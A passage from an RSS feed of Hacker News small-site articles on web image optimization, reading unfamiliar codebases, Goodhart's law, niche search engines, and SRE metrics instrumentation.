<span>min</span><span>(</span></span><br><span>          <span>var</span><span>(</span>--main-width<span>)</span><span>,</span> </span><br><span>          1280px<span>)</span> </span><br><span>        <span>min</span><span>(</span></span><br><span>          <span>calc</span><span>(</span><span>var</span><span>(</span>--main-width<span>)</span> * 0.66640625<span>)</span><span>,</span> </span><br><span>          853px<span>)</span><span>;</span></span><span>"</span></span><br><span>/&gt;</span></span></code></pre><h2 id="avif">AVIF <a href="#avif">#</a></h2><p><a href="https://jakearchibald.com/2020/avif-has-landed/">AVIF</a> is the most recent image format that has gained adoption in web browsers. It is currently supported in Chromium browsers, and available behind a flag in Firefox. Safari support isn't available yet, but given that Apple is a member of the <a href="http://aomedia.org/">group</a> that is behind the format, we can expect future support.</p><p>AVIF is notable because it very consistently outperforms JPEG in a very significant way. This is different from WebP which doesn't always produce smaller images than JPEG and may actually be a net-loss due to lack of support for progressive loading.</p><p>To implement progressive enhancement for AVIF, use the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/picture"><code>picture</code> element</a>.</p><p>The actual <code>img</code> element is nested in the <code>picture</code>. This can be quite confusing, because the <code>img</code> is sometimes described as fallback for browsers without picture support but basically the <code>picture</code> element only helps with <code>src</code> selection but has no layout itself. The element that is drawn (and which you style) is the <code>img</code> element.</p><p>Until very recently it was relatively difficult to actually encode AVIF images on the server-side, but with the latest version of libraries like <a href="https://github.com/lovell/sharp">sharp</a> it is now trivial.</p><pre><code><span><span><span>&lt;</span>picture</span><span>&gt;</span></span><br>  <span><span><span>&lt;</span>source</span><br>    <span>sizes</span><span><span>=</span><span>"</span>(max-width: 608px) 100vw, 608px<span>"</span></span><br>    <span>srcset</span><span><span>=</span><span>"</span><br>      /img/Z1s3TKV-1920w.avif 1920w,<br>      /img/Z1s3TKV-1280w.avif 1280w,<br>      /img/Z1s3TKV-640w.avif   640w,<br>      /img/Z1s3TKV-320w.avif   320w<br>    <span>"</span></span><br>    <span>type</span><span><span>=</span><span>"</span>image/avif<span>"</span></span><br>  <span>/&gt;</span></span><br>  <br>  <span><span><span>&lt;</span>img</span> <span>/&gt;</span></span><br><span><span><span>&lt;/</span>picture</span><span>&gt;</span></span></code></pre><h2 id="load-the-right-number-of-pixels">Load the right number of pixels <a href="#load-the-right-number-of-pixels">#</a></h2><p>You might have noticed the <code>srcset</code> and <code>sizes</code> attributes in the snippet above. Using the <code>w</code> selector it tells the browser which URL to use based on the physical pixels that would be used if the image was drawn to the user's device given the width calculated from the <code>sizes</code> attribute (which is a media query expression).</p><p>With this the browser will always download the smallest possible image that provides the best image quality for the user. Or it may select a smaller image if, for example, the user has opted into some kind of data-saving mode.</p><h3 id="fallbacks">Fallbacks <a href="#fallbacks">#</a></h3><p>Provide more source elements with <code>srcset</code>s for browsers that only support legacy image formats.</p><pre><code><span><span><span>&lt;</span>source</span><br>  <span>sizes</span><span><span>=</span><span>"</span>(max-width: 608px) 100vw, 608px<span>"</span></span><br>  <span>srcset</span><span><span>=</span><span>"</span><br>    /img/Z1s3TKV-1920w.webp 1920w,<br>    /img/Z1s3TKV-1280w.webp 1280w,<br>    /img/Z1s3TKV-640w.webp   640w,<br>    /img/Z1s3TKV-320w.webp   320w<br>  <span>"</span></span><br>  <span>type</span><span><span>=</span><span>"</span>image/webp<span>"</span></span><br><span>/&gt;</span></span><br><span><span><span>&lt;</span>source</span><br>  <span>sizes</span><span><span>=</span><span>"</span>(max-width: 608px) 100vw, 608px<span>"</span></span><br>  <span>srcset</span><span><span>=</span><span>"</span><br>    /img/Z1s3TKV-1920w.jpg 1920w,<br>    /img/Z1s3TKV-1280w.jpg 1280w,<br>    /img/Z1s3TKV-640w.jpg   640w,<br>    /img/Z1s3TKV-320w.jpg   320w<br>  <span>"</span></span><br>  <span>type</span><span><span>=</span><span>"</span>image/jpeg<span>"</span></span><br><span>/&gt;</span></span></code></pre><h2 id="caching-%2F-immutable-urls">Caching / Immutable URLs <a href="#caching-%2F-immutable-urls">#</a></h2><p>Embed a hash of the bytes in the image in the URL of the image. In the examples above I'm doing that with the <code>Z1s3TKV</code> in the image URLs. That way the URL will change if the image changes and respectively you can apply infinite cache expiration for your images. You want your caching headers to look something like this <code>cache-control: public,max-age=31536000,immutable</code>.</p><p><code>immutable</code> is the semantically correct <code>cache-control</code> value, but unfortunately it isn't widely supported in browsers (I'm looking at you, Chrome). <code>max-age=31536000</code> is the fallback to cache for a year. <code>public</code> is important to allow your CDN to cache the image and deliver it from the edge. But only use that if it is appropriate from a privacy perspective.</p><h2 id="lazy-loading">Lazy loading <a href="#lazy-loading">#</a></h2><p>Adding <code>loading="lazy"</code> to the <code>img</code> instructs the browser to only start fetching the image as it gets closer to the screen and is likely to actually be rendered.</p><pre><code><span><span><span>&lt;</span>img</span> <span>loading</span><span><span>=</span><span>"</span>lazy<span>"</span></span> <span>…</span> <span>/&gt;</span></span></code></pre><h2 id="asynchronous-decoding">Asynchronous decoding <a href="#asynchronous-decoding">#</a></h2><p>Adding <code>decoding="async"</code> to the <code>img</code> gives the browser permission to decode the image off the main thread avoiding user impact of the CPU-time used to decode the image. This should have no discernible downside except that it cannot always be the default for legacy reasons.</p><pre><code><span><span><span>&lt;</span>img</span> <span>decoding</span><span><span>=</span><span>"</span>async<span>"</span></span> <span>…</span> <span>/&gt;</span></span></code></pre><h2 id="blurry-placeholder">Blurry placeholder <a href="#blurry-placeholder">#</a></h2><p>A blurry placeholder is an inline image that provides the user some notion of the image that will load eventually without requiring fetching bytes from the network.</p><img alt="Sample blurry placeholder" height="853" src="https://www.industrialempathy.com/img/blurry.svg" width="1280"><p>Some notes on the implementation provided here:</p><ul><li>It inlines the blurry placeholder as a <code>background-image</code> of the image. This avoids using a second HTML element and it naturally hides the placeholder when the image loads, so that no JavaScript is needed to implement this.</li><li>It wraps the data URI of the actual image in a data URI of a SVG image. That is done because the blurring of the image is done at the SVG level instead of through a CSS filter. The result is that the blurring is only performed once per image when the SVG is rasterized, instead of on every layout saving CPU.</li></ul><pre><code><span><span><span>&lt;</span>img</span><span><span><br>  <span>style</span></span><span>="</span><br><span>      …</span><br><span>      <span>background-size</span><span>:</span> cover<span>;</span></span><br><span>      <span>background-image</span><span>:</span> </span><br><span>        <span>url</span><span>(</span>'<span>data</span><span>:</span>image/svg+xml<span>;</span>charset=utf-8<span>,</span>%3Csvg xmlns=\'http%3A//www.w3.org/2000/svg\'</span><br><span>        xmlns%3Axlink=\'http%3A//www.w3.org/1999/xlink\' viewBox=\'0 0 1280 853\'%3E%3Cfilter id=\'b\' color-interpolation-filters=\'sRGB\'%3E%3CfeGaussianBlur stdDeviation=\'.5\'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type=\'discrete\' tableValues=\'1 1\'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter=\'<span><span>url</span><span>(</span>%23b<span>)</span></span>\' x=\'0\' y=\'0\' height=\'100%25\' width=\'100%25\' </span><br><span>        xlink%3Ahref=\<span>'data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAGCAIAAACepSOSAAAACXBIWXMAAC4jAAAuIwF4pT92AAAAs0lEQVQI1wGoAFf/AImSoJSer5yjs52ktp2luJuluKOpuJefsoCNowB+kKaOm66grL+krsCnsMGrt8m1u8mzt8OVoLIAhJqzjZ2tnLLLnLHJp7fNmpyjqbPCqLrRjqO7AIeUn5ultaWtt56msaSnroZyY4mBgLq7wY6TmwCRfk2Pf1uzm2WulV+xmV6rmGyQfFm3nWSBcEIAfm46jX1FkH5Djn5AmodGo49MopBLlIRBfG8yj/dfjF5frTUAAAAASUVORK5CYII=\'%3E%3C/image%3E%3C/svg%3E'</span><span>)</span><span>;</span></span><br><span>    </span><span>"</span></span><br>  <span>…</span><br><span>/&gt;</span></span></code></pre><h3 id="(optional-ish)-javascript-optimization">(Optional-ish) JavaScript optimization <a href="#(optional-ish)-javascript-optimization">#</a></h3><p>Browsers may feel obliged to rasterize the blurry placeholder even if the image is already loaded. By removing it on image load, we solve that problem. Also, if your images contain transparency, then this is actually <em>not</em> optional as otherwise the placeholder would shine through.</p><pre><code><span><span><span>&lt;</span>script</span><span>&gt;</span></span><span><span><br>  document<span>.</span>body<span>.</span><span>addEventListener</span><span>(</span><br>    <span>"load"</span><span>,</span><br>    <span>(</span><span>e</span><span>)</span> <span>=&gt;</span> <span>{</span><br>      <span>if</span> <span>(</span>e<span>.</span>target<span>.</span>tagName <span>!=</span> <span>"IMG"</span><span>)</span> <span>{</span><br>        <span>return</span><span>;</span><br>      <span>}</span><br>      <br>      e<span>.</span>target<span>.</span>style<span>.</span>backgroundImage <span>=</span> <span>"none"</span><span>;</span><br>    <span>}</span><span>,</span><br>     <span>true</span><br>  <span>)</span><span>;</span><br></span></span><span><span><span>&lt;/</span>script</span><span>&gt;</span></span></code></pre><p>This is a list of known technologies and tools implementing all of these optimizations:</p><ul><li><a href="https://github.com/google/eleventy-high-performance-blog">eleventy-high-performance-blog</a></li></ul><p>If you know of a technology (can be a combination of multiple "modules" or similar if they work well together) that should be on this list, please <a href="https://twitter.com/cramforce">ping me</a>.</p><share-widget></share-widget><p>Published <time datetime="2020-12-28">28 Dec 2020</time></p></article></div></div>]]>
            </description>
            <link>https://www.industrialempathy.com/posts/image-optimizations/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25563479</guid>
            <pubDate>Mon, 28 Dec 2020 21:34:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to familiarize yourself with a new codebase]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25562696">thread link</a>) | @cohix
<br/>
December 28, 2020 | https://blog.suborbital.dev/how-to-familiarize-yourself-with-a-new-codebase | <a href="https://web.archive.org/web/*/https://blog.suborbital.dev/how-to-familiarize-yourself-with-a-new-codebase">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1609181702132/Jl1bi-T1p.jpeg?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=compress"><div><div itemprop="text"><p>A few weeks ago, a tweet made me take a second and think about something that I'd never consciously considered before; how can you approach an unfamiliar codebase and start to understand it?</p>

<p>It got me thinking about how I would approach a new repo that I'd never seen before but needed to make a contribution against, like a bug fix. I remembered my early days of learning <a target="_blank" href="https://kubernetes.io/">Kubernetes</a>, and wanting to make requests to the its API (because using the command line wasn't good enough for me, apparently). I had been trying to work out how to automatically deploy a particular branch of a GitLab repo into a cluster every time someone pushed to it. I had big ideas about automating DNS, setting up automated certificates, and adding a Slackbot to notify you whenever a new deploy happened.</p>
<p>If I remember correctly, I got a proof of concept working, and then it never went much past that. Given how popular <a target="_blank" href="https://www.cloudbees.com/gitops/what-is-gitops">GitOps</a> has become, maybe I should have stuck with it! When I started delving into the Kuberenetes side of the project, I was completely and utterly lost. The documentation didn't have much in the way of <em>how</em> to use the API (I'm sure nowadays things are much better), and reading the Kubernetes source code was a complete non-starter because well, that thing is a monster. I remember thinking to myself that I just needed to replicate what kubectl was doing to create a new Deployment.</p>
<p>So I gave up trying to read Kubernetes' source, and moved over to the <a target="_blank" href="https://github.com/kubernetes/kubectl">source for kubectl</a>. This is where I started to make some headway! I was able to follow straight from the <code>main()</code> function to the <code>apply</code> command, down through the logic until it started making API requests. It felt so good to finally get an answer, and to just import some Go packages to make it all work in short order!*</p>
<p>This is the background behind my answer to the tweet above:</p>

<p>Since that project years ago, I've sort of instinctively followed this strategy whenever I need to reason about a new codebase because well, it works! Only recently did this tweet make me think about it concretely, and I'm glad it did. I tried to replicate this purposefully to test my strategy. I went to a <a target="_blank" href="https://github.com/fluxcd/flux2">large open-source repo</a> and tried to find the code where it installed itself into a cluster. Using this strategy, I started with the tool's <code>main()</code> and then was able to find my way to the <code>install</code> command, which led me down to where the installation happens (funnily enough, by calling <code>kubectl</code>).</p>
<p>I think it's important for any developer to understand not only how to reason about an unfamiliar codebase, but also to realize that an important way that we learn is by trial and error. When we try something and it works, it brings us joy and we'll continue to do it, even if we don't realize it. I think it's a good idea to take a second to think about these moments when they happen, take a mental note of it so that next time you come across a similar problem, you can consciously use your previous learning and expand upon the strategies you've developed over time.</p>
<p>The reason I wanted to turn this tweet into a full blog post is because it made me realize that one of the goals for <a target="_blank" href="https://github.com/suborbital/atmo">Atmo</a> is to make it easier for developers to reason about applications. Since Atmo uses a declarative format for building backend applications (using WebAssembly modules), there is always one canonical entrypoint; the Directive. From there, you can easily reason about what the application is doing because it is <a target="_blank" href="https://stackoverflow.com/a/1784702">declarative instead of imperative</a>. This is one of the things that made Kubernetes so popular. Being able to describe your application in a simple format, and then have a system "make it happen" is a magical thing, and Atmo strives to do exactly that.</p>
<p>Atmo is gaining new functionality every week. If you want to learn more, check out <a target="_blank" href="https://suborbital.dev/">the Suborbital homepage</a></p>
<ul>
<li>When I say "short order", I'm sure it still took several days to get everything working, but once you unblock yourself on a big problem, everything after that just seems to fly by.</li>
</ul>
<p>Cover Photo by <a target="_blank" href="https://unsplash.com/@rafifatmaka">Rafif Prawira</a> on <a target="_blank" href="https://unsplash.com/s/photos/maze">Unsplash</a></p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.suborbital.dev/how-to-familiarize-yourself-with-a-new-codebase</link>
            <guid isPermaLink="false">hacker-news-small-sites-25562696</guid>
            <pubDate>Mon, 28 Dec 2020 20:09:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Goodhart’s law, perverse incentives, and rats with no tails]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25562623">thread link</a>) | @mcrittenden
<br/>
December 28, 2020 | https://critter.blog/2020/12/28/goodharts-law-perverse-incentives-and-rats-with-no-tails/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/12/28/goodharts-law-perverse-incentives-and-rats-with-no-tails/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4704">
	<!-- .entry-header -->

	<div>
		
<p>1902 was <a href="https://www.atlasobscura.com/articles/hanoi-rat-massacre-1902">a big year for rats</a> in Hanoi, Vietnam.</p>



<p>The city had spent the past few years building a city-wide sewer system, and toilets with running water became a symbol of progress and status. Of course, all those miles of underground sewage pipe were predator-free real estate for rats, so they multiplied.</p>



<p>When the rats got hungry, they’d follow the sewage lines to the surface. Those <a href="https://critter.blog/2020/12/07/spend-your-money-where-you-spend-your-time/">high status toilets</a> didn’t seem so desirable once rats started popping out, bringing everything from gross ickyness to bubonic plague.</p>



<p>So the government created a bounty program. Bring in the severed tail of a rat and get paid, simple as that. The Great Hanoi Rat Massacre picked up quickly, and at its peak, citizens killed over 20,000 rats in a single day. So far so good.</p>



<p>But <a href="https://critter.blog/2020/12/10/the-tragedy-of-the-commons-in-software-development/">people are greedy</a>. They started cutting the tails off and then releasing the rats back into the wild to breed. More breeding leads to more rats which leads to more tails which leads to more money. Simple economics. Some people even threw together makeshift rat breeding operations. </p>



<p>And just like that, Hanoi’s rat problem was worse than ever. </p>



<p>The rat bounty is an example of a <a href="https://en.wikipedia.org/wiki/Perverse_incentive">perverse incentive</a>. Whenever you see a reward that ends up encouraging the opposite of the behavior it was aiming for, you know you’ve got a perverse incentive on your hands.</p>



<p>The classic example in the development world is our friend <em>the velocity goal</em>. Misguided managers sometimes set a velocity goal in an effort to increase the productivity and value of the team. Usually it’s something like: “Let’s aim for 25 story points every sprint!” Or even worse, maybe it’s at an individual level: “Everyone aim for 10 story points per sprint!”</p>



<p>Of course people start “breeding rats” to game the system. They’ll over-inflate the estimates. They’ll tackle a ton of easy 1-pointer bug tickets instead of picking up the meatier work. They’ll do things <a href="https://critter.blog/2020/10/14/parkinsons-law-and-friends/">fast instead of right</a>. They’ll <a href="https://critter.blog/2020/10/05/guerrilla-productivity-tactics/">ignore their blocked coworkers</a> because they’re <a href="https://critter.blog/2020/12/10/the-tragedy-of-the-commons-in-software-development/">too focused on hitting their own goals</a>. This is not the way to increase the productivity and value of the team. A velocity goal is <a href="https://critter.blog/2020/12/22/power-in-naming-things/">a perverse incentive</a>. </p>



<p><a href="https://en.wikipedia.org/wiki/Goodhart%27s_law">Goodhart’s law</a> is one of my all time favorites. Here’s the simplified version:</p>



<blockquote><p>When a measure becomes a target, it ceases to be a good measure.</p></blockquote>



<p>Because remember, <a href="https://critter.blog/2020/11/12/velocity-doesnt-measure-value/">velocity</a> itself isn’t bad. It’s <a href="https://critter.blog/2020/08/20/plan-the-sprint-not-the-project/">useful for forecasting</a>, for example. But the second we turn the velocity measure into a target, it stops being a good measure. People game the system in an attempt to hit the target, and the value of the measure gets lost along the way.</p>



<p>Automated testing code coverage also comes to mind. As a measure, sure, it’s useful. But when a team decides something like “we need 80% code coverage” then it stops being useful. It doesn’t take long for the tail-less rats to start breeding. Then we’re left with tests that aren’t valuable but contribute to the coverage goal. </p>



<p>Those pointless tests take time to run and someone has to maintain them. So instead of making automated testing more useful, we’ve made it less useful. Perverse incentive. </p>



<p>It’s a sticky wicket, Goodhart’s law. Obviously, some things need to be targets, right? What is a company without goals? But how can we make sure we’re not creating perverse incentives? </p>



<p>The silver bullet is a ruthless adherence to <a href="https://critter.blog/2020/11/16/the-2-responsibilities-of-a-manager/">outcome-based goals</a> over output-based goals. Outcomes are what the business wants or needs to achieve. Outputs are the actions that help reach an outcome. We want goals to be based around what the business wants, not the steps we think will get us there. </p>



<p>Velocity goals and code testing coverage goals are <em>output</em> based. They’re the steps we think will get us to the outcomes we want. What are the <em>outcomes</em> we want? Let’s build the goals around those.  </p>




	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://critter.blog/2020/12/28/goodharts-law-perverse-incentives-and-rats-with-no-tails/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25562623</guid>
            <pubDate>Mon, 28 Dec 2020 20:00:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Is Killing Our Productivity. What We Can Do About It?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25562431">thread link</a>) | @simplecto
<br/>
December 28, 2020 | https://www.simplecto.com/using-a-search-engine-as-part-of-your-workflow/ | <a href="https://web.archive.org/web/*/https://www.simplecto.com/using-a-search-engine-as-part-of-your-workflow/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p><strong>tldr;</strong> Information retrieval is a critical part of creative work. Google's once awesome search product is now a tool of distraction. In response I share some ideas about new ways of working with "workspace" search.</p><h3 id="all-work-requires-looking-it-up">All work requires "looking it up"</h3><p>I've been a developer, a manager, a cook, and an old Mercedes station wagon repair man.</p><p>At every turn in those careers (some shorter lived than others) I have used information retrieval as a part of my workflow:</p><ul><li>In the kitchen I look up recipes.</li><li>I went onto forums, into old manuals, and specialist mechanics to figure out how things work on that old car.</li><li>Good old fashioned foolish "hold my beer" moments where I just had to take my best guess and hope for the best.</li><li>Ask my boss, mentor, or older folks that are around (and hope they know what they are talking about)</li></ul><h3 id="the-good-old-days">The Good Old Days</h3><p>There was a time when Google shortened the path to answers. Once we learned how to plug in the right keywords the right way it would turn over some hidden stones and reveal the gems underneath. In short order we were back to work armed with new information that would become knowledge.</p><p>But those days are gone. </p><p>The shareholders and advertisers took over and monetized the hell out of us.</p><blockquote>We were always the product.</blockquote><h3 id="google-shortens-the-distance-between-our-eyes-and-advertising">Google shortens the distance between our eyes and advertising</h3><p>Search something as simple as "Learn Django" and be greeted with this: a page full of ads and no organic results. Is this relevancy?</p><figure><img src="https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png 600w, https://www.simplecto.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png 1000w, https://www.simplecto.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png 1600w, https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-2.36.02-PM.png 1972w" sizes="(min-width: 720px) 720px"></figure><h3 id="advertising-and-seo-sewage-masquerading-as-content">Advertising and SEO sewage masquerading as content</h3><p>That field of relevant information is now a minefield of advertising and SEO sewage masquerading as content.</p><p><strong>This is especially true for developers. And even more true for new developers.</strong></p><p>It seems that I am frequently back on Google in search of a code snippet, a bug, or a docker container that already does the thing that I want.</p><p>The flow is always the same:</p><ol><li>Alt-tab to browser</li><li>Open google</li><li>Search something (<strong>this is a skill to develop</strong>)</li><li>Scan past all the ads, sketchy SEO'd sites, and hunt for what might be the right link. (<strong>This is another skill unto itself, and honed after years of bad clicks</strong>)</li><li>Click the link into new tab (there will be more new tabs as I hunt and peck)</li><li>Eventually I find a few candidate pages that might point me to a good solution.</li><li>Rinse, repeat forever.</li></ol><figure><img src="https://www.simplecto.com/content/images/2020/12/google-killing-productivity.jpg" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/google-killing-productivity.jpg 600w, https://www.simplecto.com/content/images/2020/12/google-killing-productivity.jpg 800w" sizes="(min-width: 720px) 720px"></figure><p>By the time I find something worth trying I've broken the flow and restart the climb back up the productivity curve.</p><hr><p><em>"OK, so I get it. Google no longer has your best interest at hear (if they every did). What do you propose?"</em></p><hr><p>Glad you asked.</p><h2 id="i-want-focused-results-eg-less-is-more-">I want focused results (eg. Less is more)</h2><p>In observing my own behavior I see there are a handful of resources I want to tap into when doing my work (development for example):</p><ul><li>Documentation</li><li>Code snippets</li><li>Stack traces</li><li>Community / Forums</li><li>Libraries and Plugins</li></ul><p>These come from only a few places. I don't need (or want) to walk the vast expanse of the web to only keep coming back to these same results. Google used to do a fine job of filtering and offering relevance, but again – those days are long gone.</p><p><strong>I want a workspace </strong>that focuses my attention on these few resources. I can jump into documentation, code, or find help from the <strong>curated</strong> resources offered by a niche/vertical search engine.</p><h3 id="niche-aka-vertical-search-is-worth-exploring">Niche (aka vertical) Search is worth exploring</h3><p>This is what I'm working on – a system of modules that stitch together as a focused, niche search engine. It is self-curated (by me or a community, or other entusiasts/subject matter experts) with the sole purpose to only return results optimized to my workflow.</p><p>I have:</p><ul><li>Scripts to acquire content via Web, RSS, and APIs</li><li>A database to store, retreive, and sort the information to my needs.</li><li>Simplified and controlled interfaces optimized to how I want to work, and how I want to consumer the information.</li></ul><p>The narrow scope of the project brings a few interesting side-effects:</p><ol><li>Shallow tech stack means I (or a small team) can understand all parts of it with relative competence.</li><li>Narrow focus of content means I don't have scaling issues in terms of compute, network, or storage. Only a few gigs at most.</li><li>Growing too large means that it is better to create a new engine with a narrower focus. This scales horizontally, but with some overhead on administration.</li><li>We move the challenge from the hard problem and opaque solutions of AI to the clear and simple and marketable solutions of human Curation.</li></ol><figure><div><div><p><img src="https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png" width="1944" height="1544" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png 600w, https://www.simplecto.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png 1000w, https://www.simplecto.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png 1600w, https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-5.24.58-PM.png 1944w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png" width="2000" height="1213" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png 600w, https://www.simplecto.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png 1000w, https://www.simplecto.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png 1600w, https://www.simplecto.com/content/images/size/w2400/2020/12/Screen-Shot-2020-12-28-at-5.26.37-PM.png 2400w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.simplecto.com/content/images/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png" width="2000" height="1193" alt="" srcset="https://www.simplecto.com/content/images/size/w600/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png 600w, https://www.simplecto.com/content/images/size/w1000/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png 1000w, https://www.simplecto.com/content/images/size/w1600/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png 1600w, https://www.simplecto.com/content/images/size/w2400/2020/12/Screen-Shot-2020-12-28-at-5.26.54-PM.png 2400w" sizes="(min-width: 720px) 720px"></p></div></div><figcaption>My niche/vertical search engine workspace.</figcaption></figure><p>So this is what I've been thinking about. Over the next few weeks, when working on Django projects, I will make this my first destination when seeking answers. I am curious to see if it actually improves my workflow, focus, and productivity.</p><p>A second hypothesis I will test is if this can work for others working in other ecosystems such as Javascript or Go language.</p>
			</section></div>]]>
            </description>
            <link>https://www.simplecto.com/using-a-search-engine-as-part-of-your-workflow/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25562431</guid>
            <pubDate>Mon, 28 Dec 2020 19:38:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SRE School: Instrumentation (2018)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25562193">thread link</a>) | @kalaracey
<br/>
December 28, 2020 | https://john-millikin.com/sre-school/instrumentation | <a href="https://web.archive.org/web/*/https://john-millikin.com/sre-school/instrumentation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blog-article posted="2018-03-03T18:52:24Z"><p slot="summary">Instrumentation is the foundation of a monitoring infrastructure. It is the part that directly touches the system(s) being monitored, the source of raw data for our collectors and analyzers and dashboards. It is also the only part that is not under an SRE team's direct control – instrumentation is usually plumbed through the codebase by product teams. Given this, an SRE's primary source of leverage is to make adding instrumentation as easy and painless as possible. We do this by writing instrumentation libraries with friendly, approachable, idiomatic APIs.</p><blog-section><h2 slot="title">Metrics</h2><p>Each measurable property of the system is a <i>metric</i>. Repeated measurements of a metric's value yield a <a href="https://en.wikipedia.org/wiki/Time_series">time series</a> of <i>data samples</i>. A metric's definition includes metadata about how to collect, aggregate, and interpret its samples.</p><p>Metric values can in theory be of any serializable data type, but in practice they are numbers, text, or distributions:</p><ul><li>Numeric metrics may have an associated unit, ideally in a machine-readable annotation. This is most important for metrics where the "natural" definition of a unit is divisible, e.g. to record time intervals as an integral amount of milliseconds instead of a fractional amount of seconds.</li><li>Text metrics are most often constants, but are sometimes used for gauges if there's a small number of possible values.</li><li>Distributions are used for metrics with a very large set of possible values. They are usually visualized as a histogram or heat map.</li></ul><p>A C-style enumeration such as <code>enum { OPT_FOO = 1; OPT_BAR = 2; }</code> is best reported as <code>"OPT_FOO"</code> and <code>"OPT_BAR"</code><blog-footnote-ref>[<a href="#fn:1">1</a>]</blog-footnote-ref> instead of numeric <code>1</code> and <code>2</code>.</p><p>Booleans can be thought of as the enum <code>{ FALSE, TRUE }</code>. Some monitoring systems give them a separate type to simplify query planning and analysis.</p><p>Metrics can be defined ad-hoc at point of emission, or statically in some global type. I prefer statically declared metrics because that gives the opportunity to attach <a href="#metric-metadata">metric metadata</a>.</p><p>There are four common categories of metrics: constants, gauges, counters, and distributions<blog-footnote-ref>[<a href="#fn:2">2</a>]</blog-footnote-ref>.</p><blog-section><h3 slot="title">Constants</h3><p>A metric that does not change for the lifetime of its associated system component. Samples of a constant metric will always contain the same value. Common examples are build information (e.g. git commit ID), process start time, and process ID. Don't use constants for things that are only constant-ish, such as hostnames.</p><p>Constants can be text or numbers. For numbers, integers usually work better than floats (e.g. represent your start time as <code>int64 milliseconds</code> instead of <code>float64 seconds</code>.</p><table><thead><tr><th>Time</th><th><code>/build/timestamp</code> (seconds since UNIX epoch)</th><th><code>/build/revision_id</code></th></tr></thead><tbody><tr><td>2011-12-13 14:15</td><td>1300000000</td><td>git:da39a3ee5e6b4b0d3255bfef95601890afd80709</td></tr><tr><td>2011-12-13 14:16</td><td>1300000000</td><td>git:da39a3ee5e6b4b0d3255bfef95601890afd80709</td></tr><tr><td>2011-12-13 14:17</td><td>1300000000</td><td>git:da39a3ee5e6b4b0d3255bfef95601890afd80709</td></tr></tbody></table><p>In Go, using a constant metric might look something like this:</p><blog-code syntax="go"><pre>import "foo.com/my/monitoring/impl/metric"

var (
	_TIMESTAMP   int64 /* filled in by linker */
	_REVISION_ID string /* filled in by linker */
	
	metric.NewConstantInt64("/build/timestamp", _TIMESTAMP)
	metric.NewConstantString("/build/revision_id", _REVISION_ID)
)
